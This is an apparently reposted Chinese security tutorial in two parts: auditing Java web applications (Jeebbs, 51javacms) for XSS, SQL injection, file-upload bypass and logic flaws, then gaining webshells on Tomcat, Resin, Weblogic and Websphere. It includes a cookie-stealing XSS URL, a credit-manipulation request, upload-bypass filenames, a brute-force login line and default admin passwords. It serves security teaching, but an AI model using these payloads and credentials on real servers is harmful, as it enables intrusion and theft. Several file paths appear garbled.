普通的测试一般都是按功能和模块去写测试的用例，即按照业务一块一块去测试对应的功能。这一种方式是顺着了Http请求跟踪到业务逻辑代码，相对来说比较简单方便，而且逻辑会更加的清晰。

上面的架构图和包截图不知道有没有同学仔细看，Java里面的包的概念相对来说比较严禁。公认的命名方式是com/org.公司名.项目名.业务名全小写。

如:`org.javaweb.ylog.dao`部署到服务器上对应的文件夹应当是`/WEB-INF/classes/org/javaweb/ylog/dao/`其中的.意味着一级目录。

现在知道了包和分层规范要找到控制层简直就是轻而易举了，一般来说找到Controller或者Action所在的包的路径就行了。左边是jeebbs右边是我的blog，其中的action下和controller下的都是控制层的方法。`@RequestMapping("/top.do")`表示了直接把请求映射到该方法上，Struts2略有不同，需要在xml配置一个action对应的处理类方法和返回的页面。不过这暂时不是我们讨论的话题，我们需要知道隐藏在框架背后的请求入口的类和方法在哪。 ￼

用例图：

### 用户注册问题

用户逻辑图：

容易出现的问题:

```sql
1、没有校验用户唯一性。2、校验唯一性和存储信息时拼Sql导致Sql注入。3、用户信息（用户名、邮箱等）未校验格式有效性，可能导致存储性xss。4、头像上传漏洞。5、用户类型注册时可控导致注册越权（直接注册管理员帐号）。6、注册完成后的跳转地址导致xss。复制代码
```

### Jeebbs邮箱逻辑验证漏洞：

注册的URL地址是：http://localhost/jeebbs/register.jspx， register.jspx很明显是控制层映射的URL，第一要务是找到它。然后看他的逻辑。

#### Tips：Eclipse全局搜索关键字方法 ￼

根据搜索结果找到对应文件：

根据结果找到对应的`public class RegisterAct`类，并查看对应逻辑代码： ￼

找到控制层的入口后即可在对应的方法内设上断点，然后发送请求到控制层的URL进入Debug模式。 注册发送数据包时用Tamper data拦截并修改请求当中的email为xss攻击代码。 ￼

￼

选择任意对象右键Watch即可查看对应的值（任意完整的，有效的对象包括方法执行）。 F6单步执行。

￼

F5进入validateSubmit：

F6跟到125行注册调用：

F3可以先点开registerMember类看看：

找到接口实现类即最终的注册逻辑代码：

### Jeebbs危险的用户名注册漏洞

Jeebbs的数据库结构当中用户名长度过长：

```sql
`username` varchar(100) NOT NULL COMMENT '用户名'复制代码
```

这会让你想到了什么？

当用户名的输入框失去焦点后会发送Ajax请求校验用户名唯一性。请输入一个长度介于 3 和 20 之间的字符串。也就是说满足这个条件并且用户名不重复就行了吧？前端是有用户名长度判断的，那么后端代码呢？因为我已经知道了用户名长度可以存100个字符，所以如果没有判断格式的话直接可以注册100个字符的用户名。首先输入一个合法的用户名完成客户端的唯一性校验请求，然后在点击注册发送数据包的时候拦截请求修改成需要注册的xss用户名，逻辑就不跟了跟上面的邮箱差不多，想像一下用户名可以xss是多么的恐怖。任何地方只要出现粗线下xss用户名就可以轻易拿到别人的cookie。 ￼

### Cookie明文存储安全问题： ￼

代码没有任何加密就直接setCookie了，如果说cookie明文储存用户帐号密码不算漏洞的话等会弹出用户明文密码不知道是算不算漏洞。

### 个性签名修改为xss,发帖后显示个性签名处可xss ￼

因为个性签名会在帖子里显示，所以回帖或者发帖就会触发JS脚本了。这里说一下默认不记住密码的情况下（不设置cookie）不能够拿到cookie当中的明文密码，这个漏洞用来打管理员PP挺不错的。不应该啊，起码应该过滤下。

### 不科学的积分漏洞

积分兑换方法如下：

```typescript
@RequestMapping(value = "/member/creditExchange.jspx")public void creditExchange(Integer creditIn, Integer creditOut, Integer creditOutType, Integer miniBalance, String password, HttpServletRequest request, HttpServletResponse response) {}复制代码
```

可以看到这里直接用了SpringMvc注入参数，而这些参数恰恰是控制程序逻辑的关键。比如构建如下URL，通过GET或者POST方式都能恶意修改用户的积分：

```crystal
http://localhost/jeebbs/member/creditExchange.jspx?creditIn=26&creditOut=-27600&creditOutType=1&miniBalance=-10000000&password=wooyun复制代码
```

因为他的逻辑是这么写的：

```vbscript
if(user.getPoint()-creditOut>miniBalance){    balance=true;}else{    flag=1;}复制代码
```

从User对象里面取出积分的数值，而积分兑换威望具体需要多少是在确定兑换关系后由ajax去后台计算出来的，提交的时候也没有验证计算的结果有没有被客户端改过。其中的creditOut和miniBalance都是我们可控的。所以这个等式不管在什么情况下我们都可以让它成立。

### 打招呼XSS 逻辑有做判断：

```undefined
1、用户名为空。2、不允许发送消息给自己。3、用户名不存在。复制代码
```

在控制层并没有做过滤： ￼

￼

在调用com.jeecms.bbs.manager.impl. BbsMessageMngImpl.java的sendMsg方法的时候依旧没有过滤。到最终的BbsMessageDaoImpl 的save方法还是没有过滤就直接储存了; 一般性的做法，关系到用户交互的地方最好做referer和xss过滤检测，控制层负责收集数据的同时最好处理下用户的请求，就算controller不处理起码在service层做下处理吧。

#### 发布投票贴xss发布一片投票帖子，标题xss内容。

#### 邮箱的两处没有验证xss

#### 个人资料全部xss

#### 投稿打管理员后台点击查看触发

#### 搜索xss

http://demo.jeecms.com/search.jspx?q=%2F%3E%3Cscript%3Ealert%28document.cookie%29%3B%3C%2Fscript%3Ehello&channelId=

漏洞N………

### 按程序实现逆向测试

#### ”逆向”找SQL注入

SQL注入理论上是最容易找的，因为SQL语句的特殊性只要Ctrl+H 搜索select、from 等关键字就能够快速找到项目下所有的SQL语句，然后根据搜索结果基本上都能够确定是否存在SQL注入。**凡是SQL语句中出现了拼SQL（如select * from admin where id=’”+id+”’）那么基本上80%可以确定是SQL注入。但也有特例，比如拼凑的SQL参数并不受我们控制，无法在前台通过提交SQL注入语句的方式去控制最终的查询SQL。而采用预编译?占位方式的一般不存在注入。**

比如搜索51javacms项目当中的SQL语句： ￼

#### Tips:ORM框架特殊性

### Hibernate HQL：

需要注意的是Hibernate的HQL是对对象进行操作，所以它的SQL可能是：

```java
String hql = "from Emp";Query q = session.createQuery(hql);复制代码
```

也可以

```java
String hql = "select count(*) from Emp";Query q = session.createQuery(hql);复制代码
```

甚至是

```java
String hql = "select new Emp(e.empno,e.ename) from Emp e ";Query q = session.createQuery(hql);复制代码
```

### Mybatis(Ibatis3.0后版本叫Mybatis)：

Ibatis、Mybatis的SQL语句可以基于注解的方式写在类方法上面，更多的是以xml的方式写到xml文件。

￼

在当前项目下搜索SQL语句关键字，查找疑似SQL注入的调用：

进入搜索结果的具体逻辑代码：

最外层的Contrller： ￼

“逆向”找到控制层URL以后构建的SQL注入请求：

可能大家关注的代码审计最核心的怎么去发掘SQL注入这样高危的漏洞，其次是XSS等类型的漏洞。

#### 小结：

```rust
学会怎样Debug。学会怎样通过从控制层到最终的数据访问层的代码跟踪和从数据访问层倒着找到控制层的入口。学会怎样去分析功能模块的用例。复制代码
```

### 文件上传、下载、编辑漏洞

文件上传漏洞即没有对上传的文件的后缀进行过滤，导致任意文件上传。有的时候就算有后缀判断，但是由于解析漏洞造成GETSHELL这是比较难避免的。

#### 1、没有做任何限制的上传漏洞：

这一种是不需要任何绕过直接就可以上传任意脚本威胁性可想而知。

#### 2、Bypass白名单和黑名单限制

某些时候就算做了后缀验证我们一样可以通过查看验证的逻辑代码找到绕过方式。第35、36行分别定义了白名单和黑名单后缀列表。41到46行是第一种通过黑名单方式校验后缀合法性。47到57行代码是第二种通过白名单方式去校验后缀合法性。现在来瞧下上诉代码都有那些方式可以Bypass。

```scss
1、假设37行代码的upload不是在代码里面写死了而是从客户端传入的参数，那么可以自定义修改path把文件传到当前server下的任意路径。2、第39行犯下了个致命的错误，因为文件名里面可以包含多个”.”而”xxxxx”.indexOf(“.”)取到的永远是第一个”.”,假设我们的文件名是1.jpg.jsp即可绕过第一个黑名单校验。3、第42行又是另一个致命错误s.equals(fileSuffix)比较是不区分大小写假设我们提交1.jSP即可突破验证。4、第50行同样是一个致命的错误，直接用客户端上传的文件名作为最终文件名，可导致多个漏洞包括解析漏洞和上面的1.jpg.jsp上传漏洞。复制代码
```

#### 文件上传漏洞修复方案:

```scss
1、文件上传的目录必须写死2、把原来的fileName.indexOf(".")改成fileName.lastIndexOf(".")3、s.equals(fileSuffix)改成s.equalsIgnoreCase(fileSuffix) 即忽略大小写或者把前面的fileSuffix字符转换成小写s.equals(fileSuffix.toLowerCase())复制代码
```

### 文件下载漏洞

51JavaCms典型的文件下载漏洞，我们不妨看下其逻辑为什么会存在漏洞。51javacms并没有用流行的SSH框架而是用了Servlert3.0自行做了各种封装，实现了各种漏洞。Ctrl+H搜索DownLoadFilePage找到下载的Servlet：

改装了下51javacms的垃圾代码： ￼

请求不存在的文件：

跨目录请求一个存在的文件：

### 文件编辑漏洞

JeeCms之前的后台就存在任意文件编辑漏洞（JEECMS后台任意文件编辑漏洞and官方漏洞及拿shell ：http://wooyun.org/bugs/wooyun-2010-04030）官方的最新的修复方式是把path加了StartWith验证。

## 基于Junit高级测试

---

Junit写单元测试这个难度略高需要对代码和业务逻辑有比较深入的了解，只是简单的提下,有兴趣的朋友可以自行了解。

JUnit是由 Erich Gamma 和 Kent Beck 编写的一个回归测试框架（regression testing framework）。Junit测试是程序员测试，即所谓白盒测试，因为程序员知道被测试的软件如何（How）完成功能和完成什么样（What）的功能。Junit是一套框架，继承TestCase类，就可以用Junit进行自动测试了。

## 其他

---

### 1、通过查看Jar包快速定位Struts2漏洞

比如直接打开lerxCms的lib目录：

### 2、报错信息快速确认Server框架

类型转换错误：

Struts2：

### 3、二次校验逻辑漏洞

比如修改密保邮箱业务只做了失去焦点唯一性校验，但是在提交的时候听没有校验唯一性

### 4、隐藏在Select框下的邪恶

Select下拉框能有什么漏洞？一般人我不告诉他，最常见的有select框Sql注入、存储性xss漏洞。搜索注入的时候也许最容易出现注入的地方不是搜索的内容，而是搜索的条件！

Discuz select下拉框存储也有类型的问题，但Discuz对Xss过滤较严未造成xss：

下拉框的Sql注入： ￼

小结： 本节不过是漏洞发掘审计的冰山一角，很多东西没法一次性写出来跟大家分享。本系列完成后公布ylog博客源码。本节源代码暂不发布，如果需要源码站内。
# 攻击JavaWeb应用、Server篇


## java应用服务器

---

Java应用服务器主要为应用程序提供运行环境，为组件提供服务。**Java 的应用服务器很多，从功能上分为两类：JSP 服务器和 Java EE 服务器。**

### 常见的Server概述

常见的Java服务器:Tomcat、[Weblogic](https://so.csdn.net/so/search?q=Weblogic&spm=1001.2101.3001.7020)、JBoss、GlassFish、Jetty、Resin、IBM Websphere、Bejy Tiger、Geronimo、Jonas、Jrun、Orion、TongWeb、BES Application Server、ColdFusion、Apusic Application Server、Sun Application Server 、Oracle9i/AS、Sun Java System Application Server。

Myeclipse比较方便的配置各式各样的Server，一般只要简单的选择下Server的目录就行了。  
 ￼ ![enter image description here](http://drops.leesec.com/wooyun-img/c070902984fbf2fb2fc753c4f2368b079ce375dc.jpg)

部署完成后启动进入各个Server的后台：

![enter image description here](http://drops.leesec.com/wooyun-img/6c0a96ec7d4b2910c536daa916ed06f355fa522b.jpg) ￼

### 构建WebShell war文件

```undefined
1、打开Myeclipse新建Web项目2、把jsp放到WebRoot目录下3、导出项目为war文件
```

![enter image description here](http://drops.leesec.com/wooyun-img/25a24f34023e041e440d5da41d38eee05b84ded2.jpg) ￼

## Tomcat

---

Tomcat 服务器是一个免费的开放源代码的Web 应用服务器，属于轻量级应用服务器，在中小型系统和并发访问用户不是很多的场合下被普遍使用，是开发和调试JSP 程序的首选。

### Tomcat版本

Tomcat主流版本:5-6-7，最新版Tomcat8刚发布不久。Tomcat5较之6-7在文件结构上有细微的差异，6-7-8没有大的差异。最新版的Tomcat8主要新增了：Servlet 3.1, JSP 2.3, EL 3.0 and Web Socket 1.0支持。

版本详情说明：[http://tomcat.apache.org/whichversion.html](http://tomcat.apache.org/whichversion.html)

结构目录：

Tomcat5：

```sql
Bin、common、conf、LICENSE、logs、NOTICE、RELEASE-NOTES、RUNNING.txt、Server、shared、Temp、webapps、work
```

Tomcat6-8：

```crystal
Bin、conf、lib、LICENSE、logs、NOTICE、RELEASE-NOTES、RUNNING.txt、temp、webapps、work
```

关注conf和webapps目录即可。conf目录与非常重要的tomcat配置文件比如登录帐号所在的tomcat-users.xml；域名绑定目录、端口、数据源(部分情况)、SSL所在的server.xml；数据源配置所在的context.xml文件，以及容器初始化调用的web.xml。

源码下载：

Tomcat6：[http://svn.apache.org/repos/asf/tomcat/tc6.0.x/tags/TOMCAT_6_0_18/](http://svn.apache.org/repos/asf/tomcat/tc6.0.x/tags/TOMCAT_6_0_18/)

Tomcat7：[http://svn.apache.org/repos/asf/tomcat/tc7.0.x/trunk/](http://svn.apache.org/repos/asf/tomcat/tc7.0.x/trunk/)

### Tomcat默认配置

#### 1、tomcat-users.xml

Tomcat5默认配置了两个角色：tomcat、role1。其中帐号为both、tomcat、role1的默认密码都是tomcat。不过都不具备直接部署应用的权限，默认需要有manager权限才能够直接部署war包，Tomcat5默认需要安装Administration Web Application。Tomcat6默认没有配置任何用户以及角色，没办法用默认帐号登录。

配置详解：http://tomcat.apache.org/tomcat-7.0-doc/manager-howto.html#Introduction

#### 2、context.xml

Tomcat的上下文，一般情况下如果用Tomcat的自身的数据源多在这里配置。找到数据源即可用对应的帐号密码去连接数据库。

```xml
<Context>    <WatchedResource>WEB-INF/web.xml</WatchedResource>    <Resource name="jdbc/u3" auth="Container" type="javax.sql.DataSource"              maxActive="100" maxIdle="30" maxWait="10000"              username="xxxxx" password="xxxx" driverClassName="com.mysql.jdbc.Driver"              url="jdbc:mysql://192.168.0.xxx:3306/xxx?autoReconnect=true"/></Context>
```

#### 3、server.xml

Server这个配置文件价值非常高，通常的访问端口、域名绑定和数据源可以在这里找到，如果想知道找到域名对应的目录可以读取这个配置文件。如果有用Https，其配置也在这里面能够找到。

#### 4、web.xml

web.xml之前讲MVC的时候有提到过，项目初始化的时候会去调用这个配置文件这个文件一般很少有人动但是不要忽略其重要性，修改web.xml可以做某些YD+BT的事情。

### Tomcat获取WebShell

#### Tomcat后台部署war获取WebShell

登录tomcat后台：http://xxx.com/manager/html，一般用`WAR file to deploy`就行了，`Deploy directory or WAR file located on server`这种很少用。

**1>Deploy directory or WAR file located on server**

Web应用的URL入口、XML配置文件对应路径、WAR文件或者该Web应用相对于/webapps目录的文件路径，然后单击 按钮，即可发布该Web应用，发布后在Application列表中即可看到该Web应用的信息。这种方式只能发布位于/webapps目录下的Web应用。

**2>WAR file to deploy**

选择需要发布的WAR文件，然后单击Deploy，即可发布该Web应用，发布后在Application列表中即可看到该Web应用的信息。这种方式可以发布位于任意目录下的Web应用。

其中，第二种方式实际上是把需要发布的WAR文件自动复制到/webapps目录下，所以上述两种方式发布的Web应用都可以通过在浏览器地址栏中输入http://localhost:8080/Web进行访问。

￼ ![enter image description here](http://drops.leesec.com/wooyun-img/4f501c2fee3fc2991a5cf0be1f6e01f872ad6ed1.jpg)

```crystal
Tips:当访问xxxx.com找不到默认管理地址怎么办?1:http://xxxx.com/manager/html 查看是否存在2:ping xxxx.com 获取其IP地址，在访问：http://111.111.111.111/manager/html3:遍历server.xml配置读取配置
```

### Tomcat口令爆破

Tomcat登录比较容易爆破，但是之前说过默认不对其做任何配置的时候爆破是无效的。

Tomcat的认证比较弱，Base64(用户名:密码)编码，请求：” /manager/html/”如果响应码不是401（未经授权：访问由于凭据无效被拒绝。）即登录成功。

```sql
conn.setRequestProperty("Authorization", "Basic " + new BASE64Encoder().encode((user + ":" + pass).getBytes()));
```

### Tomcat漏洞

Tomcat5-6-7安全性并不完美，总是被挖出各种稀奇古怪的安全漏洞。在CVE和Tomcat官网也有相应的漏洞信息详情。

#### 怎样找到Tomcat的历史版本:

[http://archive.apache.org/dist/tomcat/](http://archive.apache.org/dist/tomcat/)

#### Tomcat历史版本漏洞?

Tomcat官网安全漏洞公布：

Apache Tomcat - Apache Tomcat 5 漏洞： [http://tomcat.apache.org/security-5.html](http://tomcat.apache.org/security-5.html)

Apache Tomcat - Apache Tomcat 6 漏洞： [http://tomcat.apache.org/security-6.html](http://tomcat.apache.org/security-6.html)

Apache Tomcat - Apache Tomcat7 漏洞： [http://tomcat.apache.org/security-7.html](http://tomcat.apache.org/security-7.html)

CVE 通用漏洞与披露: [http://cve.scap.org.cn/cve_list.php?keyword=tomcat&action=search&p=1](http://cve.scap.org.cn/cve_list.php?keyword=tomcat&action=search&p=1)

Cve details ：  
[http://www.cvedetails.com/product/887/Apache-Tomcat.html?vendor_id=45](http://www.cvedetails.com/product/887/Apache-Tomcat.html?vendor_id=45) [http://www.cvedetails.com/vulnerability-list/vendor_id-45/product_id-887/Apache-Tomcat.html](http://www.cvedetails.com/vulnerability-list/vendor_id-45/product_id-887/Apache-Tomcat.html)

Sebug: [http://sebug.net/appdir/Apache+Tomcat](http://sebug.net/appdir/Apache+Tomcat)

#### 怎样发现Tomcat有那些漏洞?

1、通过默认的报错页面（404、500等）可以获取到Tomcat的具体版本，对照Tomcat漏洞。

2、利用WVS之类的扫描工具可以自动探测出对应的版本及漏洞。

#### 怎样快速确定是不是Tomcat?

请求响应为:Server:Apache-Coyote/1.1 就是tomcat了。

#### Tomcat稀奇古怪的漏洞：

Tomcat的安全问题被爆过非常多，漏洞统计图：

![enter image description here](http://drops.leesec.com/wooyun-img/bfda32d47d2bb9b06f10e8f005c557809ca8f97d.jpg)

有一些有意思的漏洞，比如：Insecure default password CVE-2009-3548(影响版本: 6.0.0-6.0.20)

The Windows installer defaults to a blank password for the administrative user. If this is not changed during the install process, then by default a user is created with the name admin, roles admin and manager and a blank password.在windows安装版admin默认空密码漏洞，其实是用户安装可能偷懒，没有设置密码…

![enter image description here](http://drops.leesec.com/wooyun-img/5d4875577481b332a49cbc503f9de9a81ffbce0c.jpg)

这样的问题在tar.gz和zip包里面根本就不会存在。有些漏洞看似来势汹汹其实鸡肋得不行如：Unexpected file deletion in work directory CVE-2009-2902 都已经有deploy权限了，闹个啥。

Tomcat非常严重的漏洞（打开Tomcat security-5、6、7.html找）：

```vbnet
Important: Session fixation CVE-2013-2067 (6.0.21-6.0.36) Important: Denial of service CVE-2012-3544 (6.0.0-6.0.36) Important: Denial of service CVE-2012-2733 (6.0.0-6.0.35) Important: Bypass of security constraints CVE-2012-3546 (6.0.0-6.0.35) Important: Bypass of CSRF prevention filter CVE-2012-4431 (6.0.30-6.0.35) Important: Denial of service CVE-2012-4534 (6.0.0-6.0.35) Important: Information disclosure CVE-2011-3375 (6.0.30-6.0.33) Important: Authentication bypass and information disclosure CVE-2011-3190 (6.0.0-6.0.33)            (………………………………………………….) Important: Directory traversal CVE-2008-2938 (6.0.18) Important: Directory traversal CVE-2007-0450 (6.0.0-6.0.9)
```

如果英文亚历山大的同学，对应的漏洞信息一般都能够在中文的sebug找到。

Sebug：

![enter image description here](http://drops.leesec.com/wooyun-img/c95ae3e8e5708e75c074b0b2a0638f8efcfb06ff.jpg)

CVE 通用漏洞与披露：

![enter image description here](http://drops.leesec.com/wooyun-img/2377778d6a3ed56a7e7b3d5c49335acb04275093.jpg)

## Resin

---

Resin是CAUCHO公司的产品，是一个非常流行的application server，对servlet和JSP提供了良好的支持，性能也比较优良，resin自身采用JAVA语言开发。

Resin比较有趣的是默认支持PHP! Resin默认通过Quercus 动态的去解析PHP文件请求。（Resin3也支持，详情：[http://zone.wooyun.org/content/2467](http://zone.wooyun.org/content/2467)）

### Resin版本

Resin主流的版本是Resin3和Resin4，在文件结构上并没有多大的变化。Resin的速度和效率非常高，但是不知怎么Resin似乎对Quercus 更新特别多。

4.0.x版本更新详情：[http://www.caucho.com/resin-4.0/changes/changes.xtp](http://www.caucho.com/resin-4.0/changes/changes.xtp)

3.1.x版本更新详情：[http://www.caucho.com/resin-3.1/changes/changes.xtp](http://www.caucho.com/resin-3.1/changes/changes.xtp)

### Resin默认配置

#### 1、resin.conf和resin.xml

Tomcat和Rsin的核心配置文件都在conf目录下，Resin3.1.x 默认是resin.conf而4.0.x默认是resin.xml。resin.conf/resin.xml是Resin最主要配置文件，类似Tomcat的server.xml。

#### 1>数据源:

第一节的时候有谈到resin数据源就是位于这个文件，搜索database（位于server标签内）即可定位到具体的配置信息。

#### 2>域名绑定

搜索host即可定位到具体的域名配置，其中的root-directory是域名绑定的对应路径。很容易就能够找到域名绑定的目录了。

```xml
<host id="javaweb.org" root-directory=".">      <host-alias-regexp>^([^/]*).javaweb.org</host-alias-regexp>      <web-app id="/" root-directory="D:/web/xxxx/xxxx"/></host>
```

### Resin默认安全策略

#### 1>管理后台访问权限

Resin比较BT的是默认仅允许本机访问管理后台，这是因为在resin.conf当中默认配置禁止了外部IP请求后台。

```swift
<resin:set var="resin_admin_external" value="false"/>
```

修改为true外部才能够访问。

#### 2>Resin后台管理密码

Resin的管理员密码需要手动配置，在resin.conf/resin.xml当中搜索management。即可找到不过需要注意的是Resin的密码默认是加密的，密文是在登录页自行生成。比如admin加密后的密文大概会是：yCGkvrQHY7K8qtlHsgJ6zg== 看起来仅是base64编码不过不只是admin默认的Base64编码是：YWRtaW4= Resin,翻了半天Resin终于在文档里面找到了：[http://www.caucho.com/resin-3.1/doc/resin-security.xtp](http://www.caucho.com/resin-3.1/doc/resin-security.xtp)

￼![enter image description here](http://drops.leesec.com/wooyun-img/fb09b21526f45941067f76e2b224cd6da0ee6cb9.jpg)

虽说是MD5+Base64加密但是怎么看都有点不对，下载Resin源码找到加密算法：

```scala
package com.caucho.server.security.PasswordDigest
```

![enter image description here](http://drops.leesec.com/wooyun-img/39325249ad644b439efb48abb90fbe8f4dd5305d.jpg)

这加密已经没法反解了，所以就算找到Resin的密码配置文件应该也没法破解登录密码。事实上Resin3的管理后台并没有其他Server（相对JBOSS和Weblogic）那么丰富。而Resin4的管理后台看上去更加有趣。

Resin4的加密方式和Resin3还不一样改成了SSHA：

```css
admin_user : adminadmin_password : {SSHA}XwNZqf8vxNt5BJKIGyKT6WMBGxV5OeIi
```

详情：[http://www.caucho.com/resin-4.0/admin/security.xtp](http://www.caucho.com/resin-4.0/admin/security.xtp)

Resin3：

![enter image description here](http://drops.leesec.com/wooyun-img/939b80569ce4b6d41febd547c0478b928ba57c6e.jpg)

Resin4：

![enter image description here](http://drops.leesec.com/wooyun-img/c56ef7fbd94ebb006418b05973cff732a72d46d1.jpg)

### Resin获取WebShell

As of Resin 4.0.0, it is now possible to deploy web applications remotely to a shared repository that is distributed across the cluster. This feature allows you to deploy once to any triad server and have the application be updated automatically across the entire cluster. When a new dynamic server joins the cluster, the triad will populate it with these applications as well.

Web Deploy war文件大概是从4.0.0开始支持的，不过想要在Web deploy一个应用也不是一件简单的事情，首先得先进入后台。然后还得以Https方式访问。不过命令行下部署就没那没法麻烦。Resin3得手动配置web-app-deploy。 最简单的但又不爽办法就是想办法把war文件上传到resin-pro-3.1.13webapps目录下，会自动部署（就算Resin已启动也会自动部署，不影响已部署的应用）。

Resin3部署详情：[http://www.caucho.com/resin-3.1/doc/webapp-deploy.xtp](http://www.caucho.com/resin-3.1/doc/webapp-deploy.xtp)

Resin4部署War文件详情：[http://www.caucho.com/resin-4.0/admin/deploy.xtp](http://www.caucho.com/resin-4.0/admin/deploy.xtp)

Resin4进入后台后选择Deploy,不过还得用SSL方式请求。Resin要走一个”非加密通道”。

To deploy an application remotely: log into the resin-admin console on any triad server. Make sure you are connecting over SSL, as this feature is not available over a non-encrypted channel. Browse to the "webapp" tab of the resin-admin server and at the bottom of the page, enter the virtual host, URL, and local .war file specifying the web application, then press "Deploy". The application should now be deployed on the server. In a few moments, all the servers in the cluster will have the webapp.

￼![enter image description here](http://drops.leesec.com/wooyun-img/f0f6f450005e4f67f252db73efde07b5aa7c1705.jpg)

Resin4敢不敢再没节操点？默认HTTPS是没有开的。需要手动去打开:

```undefined
conf
```

esin.properties

```crystal
# https : 8443
```

默认8443端口是关闭的，取消这一行的注释才能够使用HTTPS方式访问后台才能够Web Deploy war。

![enter image description here](http://drops.leesec.com/wooyun-img/5af6b78f0b6efb463cdfe5ce9ce3abf77e463094.jpg)

部署成功访问: [http://localhost:8080/GetShell/Customize.jsp](http://localhost:8080/GetShell/Customize.jsp) 即可获取WebShell。

### Resin漏洞

Resin相对Tomcat的安全问题来说少了很多，Cvedetails上的Resin的漏洞统计图：

![enter image description here](http://drops.leesec.com/wooyun-img/16343792319b60e1096fce7d5f5ed9ed60a8d8ea.jpg)

Cvedetails统计详情： [http://www.cvedetails.com/product/993/Caucho-Technology-Resin.html?vendor_id=576](http://www.cvedetails.com/product/993/Caucho-Technology-Resin.html?vendor_id=576)

Cvedetails漏洞详情： [http://www.cvedetails.com/vulnerability-list/vendor_id-576/product_id-993/Caucho-Technology-Resin.html](http://www.cvedetails.com/vulnerability-list/vendor_id-576/product_id-993/Caucho-Technology-Resin.html)

CVE 通用漏洞与披露： [http://cve.scap.org.cn/cve_list.php?keyword=resin&action=search&p=1](http://cve.scap.org.cn/cve_list.php?keyword=resin&action=search&p=1)

Resin3.1.3:

![enter image description here](http://drops.leesec.com/wooyun-img/f06d4959831df9c8838e2d14e36c9d52a259cfe3.jpg)

Fixed BugList: [http://bugs.caucho.com/changelog_page.php](http://bugs.caucho.com/changelog_page.php)

## Weblogic

---

WebLogic是美国bea公司出品的一个application server确切的说是一个基于Javaee架构的中间件，BEA WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。将Java的动态功能和Java Enterprise标准的安全性引入大型网络应用的开发、集成、部署和管理之中。

### Weblogic版本

Oracle简直就是企业应用软件终结者，收购了Sun那个土鳖、Mysql、BAE Weblogic等。BAE在2008初被收购后把BAE终结在Weblogic 10。明显的差异应该是从10.x开始到最新的12c。这里主要以Weblogic9.2和最新的Weblogic 12c为例。

### Weblogic默认配置

Weblogic默认端口是7001，Weblogic10g-12c默认的管理后台是：http://localhost:7001/console

Weblogic10 以下默认后台地址是：http://192.168.80.1:7001/console/login/LoginForm.jsp

管理帐号是在建立Weblogic域的时候设置的。

![enter image description here](http://drops.leesec.com/wooyun-img/3b587e76ce719ae89dd9507d86e74d03c3f8a84b.jpg)

Weblogic控制台：

[enter link description here](http://static.wooyun.org/20141017/2014101711455629318.png)

Weblogic10以下默认管理帐号:weblogic密码：weblogic。关于Weblogic10++的故事还得从建域开始，默认安装完Weblogic后需要建立一个域。

### WebLogic中的"域"?

域环境下可以多个 WebLogic Server或者WebLogic Server 群集。域是由单个管理服务器管理的 WebLogic Server实例的集合。 Weblogic10++域默认是安装完成后由用户创建。帐号密码也在创建域的时候设置，所以这里并不存在默认密码。当一个域创建完成后配置文件和Web应用在：Weblogic12user_projectsdomains”域名”。

### Weblogic 默认安全策略

### 1、Weblogic默认密码文件:

Weblogic 9采用的3DES（三重数据加密算法）加密方式，Weblogic 9默认的管理密码配置文件位于：

```undefined
weblogic_9weblogic92samplesdomainswl_serverserversexamplesServersecurityoot.properties
```

#### boot.properties：

```crystal
Generated by Configuration Wizard on Sun Sep 08 15:43:13 GMT 2013username={3DES}fy709SQ4pCHAFk+lIxiWfw==password={3DES}fy709SQ4pCHAFk+lIxiWfw==
```

Weblogic 12c采用了AES对称加密方式，但是AES的key并不在这文件里面。默认的管理密码文件存放于：

```undefined
Weblogic12user_projectsdomainsase_domainserversAdminServersecurityoot.properties 
```

(base_domain是默认的”域名”)。

#### boot.properties：

```bash
boot.properties：# Generated by Configuration Wizard on Tue Jul 23 00:07:09 CST 2013username={AES}PsGXATVgbLsBrCA8hbaKjjA91yNDCK78Z84fGA/pTJE=password={AES}Z44CPAl39VlytFk1I5HUCEFyFZ1LlmwqAePuJCwrwjI=
```

怎样解密Weblogic密码?

Weblogic 12c：

```undefined
Weblogic12user_projectsdomainsase_domainsecuritySerializedSystemIni.dat
```

Weblogic 9：

```undefined
weblogic_9weblogic92samplesdomainswl_serversecuritySerializedSystemIni.dat
```

解密详情：[http://drops.wooyun.org/tips/349](http://drops.wooyun.org/tips/349) 、[http://www.blogjava.net/midea0978/archive/2006/09/07/68223.html](http://www.blogjava.net/midea0978/archive/2006/09/07/68223.html)

### 2、Weblogic数据源(JNDI)

Weblogic如果有配置数据源，那么默认数据源配置文件应该在：

```undefined
Weblogic12user\_projectsdomainsase\_domainconfigconfig.xml
```

![enter image description here](http://drops.leesec.com/wooyun-img/ba15dde661e75fdbde1257c2accf6e2e625a28c8.jpg)

### Weblogic获取Webshell ￼

![enter image description here](http://drops.leesec.com/wooyun-img/ea7f1dc169bbc67137f180362307fdeea2623636.jpg)

Weblogic 9 GetShell： [http://drops.wooyun.org/tips/402](http://drops.wooyun.org/tips/402)

## [Websphere](https://so.csdn.net/so/search?q=Websphere&spm=1001.2101.3001.7020)

---

WebSphere 是 IBM 的软件平台。它包含了编写、运行和监视全天候的工业强度的随需应变 Web 应用程序和跨平台、跨产品解决方案所需要的整个中间件基础设施，如服务器、服务和工具。

### Websphere版本

Websphere现在主流的版本是6-7-8，老版本的5.x部分老项目还在用。GetShell大致差不多。6、7测试都有“默认用户标识admin登录”，Websphere安装非常麻烦，所以没有像之前测试Resin、Tomcat那么细测。

### Websphere默认配置

默认的管理后台地址（注意是HTTPS）： [https://localhost:9043/ibm/console/logon.jsp](https://localhost:9043/ibm/console/logon.jsp)

默认管理密码：

```sql
1、admin (测试websphere6-7默认可以直接用admin作为用户标识登录，无需密码) 2、websphere/ websphere3、system/ manager
```

默认端口：

```scss
管理控制台端口 9060管理控制台安全端口 9043HTTP传输端口 9080HTTPS传输端口 9443引导程序端口 2809SIP端口 5060SIP安全端口 5061SOAP连接器端口 8880SAS SSL ServerAuth端口 9401CSIV2 ServerAuth 侦听器端口 9403CSIV2 MultiAuth 侦听器端口 9402ORB侦听器端口 9100高可用性管理通讯端口(DCS) 9353服务集成端口 7276服务集成安全端口 7286服务集成器MQ互操作性端口 5558服务集成器MQ互操作性安全端口 5578
```

8.5安装的时候创建密码： ￼

[enter link description here](http://static.wooyun.org/20141017/2014101711455696316.png)

Websphere8.5启动信息：

![enter image description here](http://drops.leesec.com/wooyun-img/8e40330bc26d575bc3e64e4b003f00989850d556.jpg)

